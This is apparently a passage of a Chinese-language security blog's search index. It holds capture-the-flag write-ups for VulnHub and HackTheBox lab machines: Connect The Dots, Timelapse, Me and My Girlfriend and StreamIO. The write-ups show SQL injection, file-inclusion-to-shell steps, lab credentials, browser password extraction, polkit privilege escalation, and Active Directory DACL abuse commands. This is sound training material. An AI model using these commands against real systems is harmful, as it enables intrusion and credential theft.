 /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e当真计划任务？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9f6a56dabf082ca2d285ba81ad54eb2e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE46a4b6dda52d235164ec0b31b013438d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4108281c203ff341bb11ef15e3faac0e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9dafe7604ee5233815f73b239330ef84%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x007 Sar1"},{"content":"端口扫描 目录扫描 WEB渗透 web渗透一段实践后无果，查看其他端口：\nnfs可挂载：\n收集信息：\n发现密钥：\n但是无法连接：\n至此思路断了，后面看WP，说看mysite中的cs文件，我最开始打眼一看，以为是css就是没管，没想到是CS，随后又是一个JSfuck编码和解码： 获得密码：TryToGuessThisNorris@2k19\n尝试登录：\n提权 搜查了一圈没看到太多信息，盲猜可能需要提权到morris才能提到root\n在html目录下查到了一个swp文件\n想办法复原后出现密码：blehguessme090\n获得morris成功\npolkit提权\n除了这个办法之外，看了一下评论区的https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x008-connect-the-dots-1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE74d11f3e5f68560e3557fa280859a177%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"目录扫描\"\u003e目录扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5aafe361346778506a374494f17024ac%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eWEB渗透\u003c/h1\u003e\n\u003cp\u003eweb渗透一段实践后无果，查看其他端口：\u003c/p\u003e\n\u003cp\u003enfs可挂载：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaf4e31ab75baf2a39f3d550ac992d1fb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e收集信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE30dacffaafc7e3ffebe689d4fb53732c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密钥：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd441d3a42f03800fb56f1cf91b0676d6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是无法连接：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1e8aa9370835721da8c0f6c19a2faae4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"至此思路断了后面看wp说看mysite中的cs文件我最开始打眼一看以为是css就是没管没想到是cs随后又是一个jsfuck编码和解码\"\u003e至此思路断了，后面看WP，说看mysite中的cs文件，我最开始打眼一看，以为是css就是没管，没想到是CS，随后又是一个JSfuck编码和解码：\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE506e7eb038b45845f782ff7524199b5e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6ded1483009027423da26ba1b396ba7d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e获得密码：TryToGuessThisNorris@2k19\u003c/p\u003e\n\u003cp\u003e尝试登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1dfe8d3b5beafe60e4f12209d8c5cf20%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE237afc63eb80de6bbd426df2063a1703%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2dd90e1a2b42bacc7ae16f8529e138db%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e搜查了一圈没看到太多信息，盲猜可能需要提权到morris才能提到root\u003c/p\u003e\n\u003cp\u003e在html目录下查到了一个swp文件\u003c/p\u003e\n\u003cp\u003e想办法复原后出现密码：blehguessme090\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEccaf0ed13f6fa8d2cee83c93448cecaf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e获得morris成功\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5544e450c2e97cebb7dcd465e645e1ea%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epolkit提权\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE192a194ad5350ecfce348ac0ff89d611%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e除了这个办法之外，看了一下评论区的\u003ca href=\"https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2\"\u003ehttps://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1e0ca9547397d652778dc3ef1ffe9ae1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x008 Connect The Dots 1"},{"content":"端口扫描 获取立足点 smb匿名访问：\n疑似重置后的密码？\n7c3XlgsE\n有密码：\n破解：\n但是这东西怎么用呢，后面刚好培训遇到了，pfx是一种存储个人信息的文件，简单理解可以理解为ssh密钥文件，不过普遍都是加密状态，需要解密，破解使用john即可：\nthuglegacy\n然后需要将从pfx格式的文件，\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem\nevil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S\n提权 powershell历史文件位置：\n$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n可以看到账号密码：\n$p = ConvertTo-SecureString \u0026lsquo;E3R$Q62^12p7PLlC%KWaxuaV\u0026rsquo; -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential (\u0026lsquo;svc_deploy\u0026rsquo;, $p)\n使用账号密码登录：\n查看当前权限：\n又laps的读取权限：\nlaps的解释：\n命令：\nGet-ADComputer DC01 -property *\nl@11Z8394\u0026amp;pq%$ksR(/87QMx\n总结 这台靶机的难度其实不太好评判，因为主要涉及的问题在于认知问题，而不是思路上的缺陷。\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x008-timelapse/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE018e74c2d1d6b4774bee9e153f9fa396image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE971f10663a36b5709df0dd5fdc3b60c4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE275264544e3a192dbc7b35ebacad3c79image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003esmb匿名访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7e4e95320e2efb7e81cb3556d4704ff7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e疑似重置后的密码？\u003c/p\u003e\n\u003cp\u003e7c3XlgsE\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7987f78949a8217bb11355a4a8ca844eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3c4eeca319f202c25dab2bc1ec1e574dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEacda20c829e62857094e69c518ee487aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是这东西怎么用呢，后面刚好培训遇到了，pfx是一种存储个人信息的文件，简单理解可以理解为ssh密钥文件，不过普遍都是加密状态，需要解密，破解使用john即可：\u003c/p\u003e\n\u003cp\u003ethuglegacy\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4db93b4a2a32347beeac337f1e1ac932image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后需要将从pfx格式的文件，\u003c/p\u003e\n\u003cp\u003eopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes\u003c/p\u003e\n\u003cp\u003eopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4bf5687eb4cea770d74add9eb7c84c4fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eevil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3744727b51858143258abb2fdcf6a429image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003epowershell历史文件位置：\u003c/p\u003e\n\u003cp\u003e$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\u003c/p\u003e\n\u003cp\u003e可以看到账号密码：\u003c/p\u003e\n\u003cp\u003e$p = ConvertTo-SecureString \u0026lsquo;E3R$Q62^12p7PLlC%KWaxuaV\u0026rsquo; -AsPlainText -Force\u003c/p\u003e\n\u003cp\u003e$c = New-Object System.Management.Automation.PSCredential (\u0026lsquo;svc_deploy\u0026rsquo;, $p)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5315faf8cc6fcc4214a5969b8fa62464image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X008 Timelapse"},{"content":"端口扫描 目录扫描 WEB渗透 打开页面会提示只允许本地登录，通过插件添加x-forwarded-for字段即可：\n注册账号登录，发现越权，获得账号密码，可能存在sql注入？后面跑了一下，看样子是没有：\nEweuh Tandingan\neweuhtandingan\nskuyatuh\n用burp把所有的用户名提取出来：\n两个问题：1是kali自带的burp为社区版，不支持导出，2是脚本有点垃圾，需要手动删除一点儿垃圾\nimport os\rdef extract_name(file_path):\rwith open(file_path, \u0026#39;r\u0026#39;) as file:\rcontent = file.read()\rstart_index = content.find(\u0026#39;id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#39;)\rif start_index != -1:\rstart_index += len(\u0026#39;id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#39;)\rend_index = content.find(\u0026#39;\u0026#34;\u0026#39;, start_index)\rif end_index != -1:\rreturn content[start_index:end_index]\rreturn None\rdef process_files(folder_path):\routput_file = \u0026#39;password.txt\u0026#39;\rwith open(output_file, \u0026#39;w\u0026#39;) as file:\rfor root, dirs, files in os.walk(folder_path):\rfor file_name in files:\rfile_path = os.path.join(root, file_name)\rname = extract_name(file_path)\rif name is not None:\rfile.write(name + \u0026#39;\\n\u0026#39;)\rfolder_path = \u0026#39;./\u0026#39;\rprocess_files(folder_path) 成功获得账户密码：\nUser: alice Password: 4lic3\n提权 已经比较熟练了，开局就是sudo php：\n是个哑shell，我还以为没成功呢：\n找一下userflag:\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x009-me-and-my-girlfriend-1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdfffdca74157c998c57878189cc37a67%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE936c2661ff43147fa789ee757caf2611%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"目录扫描\"\u003e目录扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd022d77849741000475cd353aa170648%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eWEB渗透\u003c/h1\u003e\n\u003cp\u003e打开页面会提示只允许本地登录，通过插件添加x-forwarded-for字段即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6e4d266c1607287caa3b678a449cb67a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e注册账号登录，发现越权，获得账号密码，可能存在sql注入？后面跑了一下，看样子是没有：\u003c/p\u003e\n\u003cp\u003eEweuh Tandingan\u003c/p\u003e\n\u003cp\u003eeweuhtandingan\u003c/p\u003e\n\u003cp\u003eskuyatuh\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb070de05e0ed111d12d493530ad08e76%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用burp把所有的用户名提取出来：\u003c/p\u003e\n\u003cp\u003e两个问题：1是kali自带的burp为社区版，不支持导出，2是脚本有点垃圾，需要手动删除一点儿垃圾\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport os\r\n\r\ndef extract_name(file_path):\r\n    with open(file_path, \u0026#39;r\u0026#39;) as file:\r\n        content = file.read()\r\n        start_index = content.find(\u0026#39;id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#39;)\r\n        if start_index != -1:\r\n            start_index += len(\u0026#39;id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#39;)\r\n            end_index = content.find(\u0026#39;\u0026#34;\u0026#39;, start_index)\r\n            if end_index != -1:\r\n                return content[start_index:end_index]\r\n    return None\r\n\r\ndef process_files(folder_path):\r\n    output_file = \u0026#39;password.txt\u0026#39;\r\n    with open(output_file, \u0026#39;w\u0026#39;) as file:\r\n        for root, dirs, files in os.walk(folder_path):\r\n            for file_name in files:\r\n                file_path = os.path.join(root, file_name)\r\n                name = extract_name(file_path)\r\n                if name is not None:\r\n                    file.write(name + \u0026#39;\\n\u0026#39;)\r\n\r\nfolder_path = \u0026#39;./\u0026#39;\r\nprocess_files(folder_path)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e成功获得账户密码：\u003c/p\u003e","title":"0x009 Me and My Girlfriend 1"},{"content":"端口扫描 获取立足点 从端口开放情况来看，值得关注的端口有：80、389、443、445、3268、5985：\n先看445和389，3268等：\n那么突破口应该就在80或者443了：\n简单看了一下首页，没有东西，目录扫描看看：\n有注册和登录：\n简单试了一下，好像没有万能密码，注册一个看看：\n但是不让登录：\n查看证书，发现域名好像不对：\n访问这个网站：\n好像也没有东西，再扫一下：\n发现新内容：\n疑似sql注入：\n输入1‘\u0026ndash;+\n但是好像有拦截：\norder by用不了，只能用select 挨个操作：\n测了半天，发现是个sqlserver:\n当前数据库名称为\nSTREAMIO\n表名：\n列名：\n爆用户：\nJames ,Theodore ,Samantha ,Lauren ,William ,Sabrina ,Robert ,Thane ,Carmon ,Barry ,Oliver ,Michelle ,Gloria ,Victoria ,Alexendra ,Baxter ,Clara ,Barbra ,Lenord ,Austin ,Garfield ,Juliette ,Victor ,Lucifer ,Bruno ,Diablo ,Robin ,Stan ,yoshihide ,admin ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,aikun\n爆密码：\n现在拿到账户密码了，然后看看这个密码是什么格式：\n看样子是md5：\n从现在拿到的账号密码来看，最简单的方式是直接登录winrm:\n但是好像失败了：\n那么就只能继续回去web看看了：\n这里的内容需要爆破，但是这里不追求速度，就直接用burp了：\n进来后确实没想到这里会有需要fuzz的地方，是这个参数：\n通过FUZZ可以发现debug这个参数：\n但是这里我没有怀疑过这个地方的使用方式，（因为写了只有管理员才可用，但是实际上这个用户就可以用了）\n应该给一个index.php的参数给他，就可以发现有报错，其实就是文件包含了：\n那么这里其实是想要读取文件，但是读取失败了，用为协议，然后base64带出来：\n就会发现这个东西：\n数据库的密码：\n(\u0026ldquo;Database\u0026rdquo;=\u0026gt;\u0026ldquo;STREAMIO\u0026rdquo;, \u0026ldquo;UID\u0026rdquo; =\u0026gt; \u0026ldquo;db_admin\u0026rdquo;, \u0026ldquo;PWD\u0026rdquo; =\u0026gt; \u0026lsquo;B1@hx31234567890\u0026rsquo;);\n但是这个数据库密码有什么用呢，数据库不对外开放，sql注入也不允许切换用户，\n可以发现master.php\n文件包含读取：\n发现里面的内容：这里需要简单看一下代码，核心是这句：\neval(file_get_contents($_POST[\u0026lsquo;include\u0026rsquo;]));，使用post传参，会包含include的文件，然后执行里面的内容：\n上传NC，反弹shell：\n这里别用start /b会出现bug:\n然后就是之前的数据库账号密码的用处了：\nsqlcmd -S \u0026lsquo;(local)\u0026rsquo; -U db_admin -P \u0026lsquo;B1@hx31234567890\u0026rsquo; -Q \u0026lsquo;USE STREAMIO_BACKUP; select username,password from users;\u0026rsquo;\n再次破解：\n用户不多，挨个看看权限即可：\n远程登录：\n提权 bloodhound bloodhound的分析结果大致意思为，需要本地提权，除非拿到MARTIN、JDGODD的用户权限：\n然后是winpeass的分析结果：\n注意这个firefox：\n然后去github上找了一个这个项目：\nhttps://github.com/AlessandroZ/LaZagne\n这里拿到了我们的目标用户权限，JDGODD，用这个用户可以根据bloodhound提权到domain admin，注意，上面显示的密码有误，可多尝试几次就可以了：\n[+] Password found !!!\nURL: https://slack.streamio.htb\nLogin: JDgodd\nPassword: JDg0dd1s@d0p3cr3@t0r\n这个用户没有远程管理权限，可能得域外打\n先拿到CORE STAFF组权限：\n修改所有者：\npython owneredit.py -action write -new-owner \u0026lsquo;JDgodd\u0026rsquo; -target \u0026lsquo;CORE STAFF\u0026rsquo; \u0026lsquo;STREAMIO.HTB\u0026rsquo;/\u0026lsquo;JDgodd\u0026rsquo;:\u0026lsquo;JDg0dd1s@d0p3cr3@t0r\u0026rsquo;\n修改DACL权限，以便于读取密码：\n授予JDgodd向CORE STAFF组添加用户的权限：\ndacledit.py -action \u0026lsquo;write\u0026rsquo; -rights \u0026lsquo;WriteMembers\u0026rsquo; -principal \u0026lsquo;JDgodd\u0026rsquo; -target-dn \u0026lsquo;CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB\u0026rsquo; \u0026lsquo;STREAMIO.HTB\u0026rsquo;/\u0026lsquo;JDgodd\u0026rsquo;:\u0026lsquo;JDg0dd1s@d0p3cr3@t0r\u0026rsquo;\n把自己添加到CORE STAFF组内：\nnet rpc group addmem \u0026ldquo;CORE STAFF\u0026rdquo; \u0026ldquo;JDgodd\u0026rdquo; -U \u0026ldquo;STREAMIO.HTB\u0026rdquo;/\u0026ldquo;JDgodd\u0026rdquo;%\u0026ldquo;JDg0dd1s@d0p3cr3@t0r\u0026rdquo; -S \u0026ldquo;dc.STREAMIO.HTB\u0026rdquo;\n再次查看权限：\n读取密码：\n登录：\n总结 这台靶机的难点在于获取立足点较为曲折，简单梳理一下：\nweb：\n1、首先是注册用户，添加域名，需要反复查看证书是否变化，域名有两个，第一次卡住，没发现域名变化。\n2、使用新域名，再次目录扫描，发现查找页面，sql注入，是个sqlserver手动注入，需要熟悉。\n3、由于是通过websql注入获取的账户密码，通过获取到的账户密码，进行web爆破，获取到一个合法用户，这里的手动登录有问题，不会弹出错误，也不清楚是不是系统存在bug，所以遇到这种情况还是尽量使用工具爆破一波再说。\n4、登录后没有变化，但是可以进去之前403的admin目录，注意页面功能的？后面的参数可以fuzz，第二次卡住。\n5、fuzz发现debug，参数给index.php发现有反应，是个文件包含，需要配合伪协议base64导出，发现数据库账号密码，但是没有连接条件。\n6、第三次卡住，需要再次目录扫描admin目录，发现master.php文件，通过文件包含可以读取源码。\n7、代码审计，发现include参数可以包含执行php代码，通过debug文件包含+post传参+远程文件包含，成功拿到shell，这里面细节很多，多次导致web访问崩掉，要么重启，要么等很长时间。\n提权\n8、使用拿到的高权限数据库账密，再次查询sqlserver，发现USE STREAMIO_BACKUP数据库，疑似备份数据库，发现新账户密码。\n9、再次破解后，经过尝试，终于获取到域内用户身份，登录winrm。\n10、bloodhound成功告诉我们提权路径，但是目前身份欠缺，需要寻找立足点。\n11、通过winpeass发现疑似firefox的账号密码信息，通过LaZagne项目，成功读取，但是密码乱序，需要爆破。\n12、通过尝试，成功拿到了JDgodd用户身份，该身份是bloodhound提示的可提权身份之一。\n13、通过JDgodd的writeowner权限，成功获取了CORE STAFF组的owner，owner拥有writedacl权限。\n14、通过向CORE STAFF组添加自己的身份，成功进入该组。\n15、CORE STAFF组拥有ldap的密码读取权限，成功读取dc的密码\n16、登录dc，administrator\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x009-streamio/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3257329be177fe9aef7e4aaf52293d27image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd3c1b4b24bc3595c19b76fd9c7a427e1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbad7ae63e95fb7c7ab832c90dcb3c920image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e从端口开放情况来看，值得关注的端口有：80、389、443、445、3268、5985：\u003c/p\u003e\n\u003cp\u003e先看445和389，3268等：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4a281f5b3be9d6918b712cc983ca01fdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf3f130c2816498be203fa0fb14fd62aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么突破口应该就在80或者443了：\u003c/p\u003e\n\u003cp\u003e简单看了一下首页，没有东西，目录扫描看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd0d40e50c454fdb84b6ec6ec134d9a84image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有注册和登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE17ea2ef4df506d9f2b6d590de8e8896fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e简单试了一下，好像没有万能密码，注册一个看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdfe5603f94b28380e2893807f702875aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是不让登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbb1872229a80d5870f7a8b2c0ee61cadimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看证书，发现域名好像不对：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE24fe63e5dd0fbbb8607cad6090bceda5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e访问这个网站：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf16ac18a8c8ec5e36e6e9823fed7ce1aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好像也没有东西，再扫一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6e2747aa5f9e5ed0c57c279d3ecfb9ffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现新内容：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE94b59761b65a13c2d34f8d708f1ce12dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e疑似sql注入：\u003c/p\u003e\n\u003cp\u003e输入1‘\u0026ndash;+\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3f154c70c42d264e0354e08271598deeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是好像有拦截：\u003c/p\u003e\n\u003cp\u003eorder by用不了，只能用select  挨个操作：\u003c/p\u003e\n\u003cp\u003e测了半天，发现是个sqlserver:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd3526c4ab1b930e13333a6ba8fcc7230image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e当前数据库名称为\u003c/p\u003e\n\u003cp\u003eSTREAMIO\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8e2af23e6e1232cf3c8c74ca9c6d6549image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e表名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE092d98297cb3dcdf9425e1f52fd32d62image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e列名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf06a3da5fc6fa9f6c7592d1700052202image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE73d4eb15471bc65d5caa1927142b8ce7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eJames ,Theodore ,Samantha ,Lauren ,William ,Sabrina ,Robert ,Thane ,Carmon ,Barry ,Oliver ,Michelle ,Gloria ,Victoria ,Alexendra ,Baxter ,Clara ,Barbra ,Lenord ,Austin ,Garfield ,Juliette ,Victor ,Lucifer ,Bruno ,Diablo ,Robin ,Stan ,yoshihide ,admin ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,aikun\u003c/p\u003e","title":"0X009 StreamIO"},{"content":"端口扫描 信息收集 21端口，有匿名登录，但是目前来看没有发现什么有效的东西：\n2049 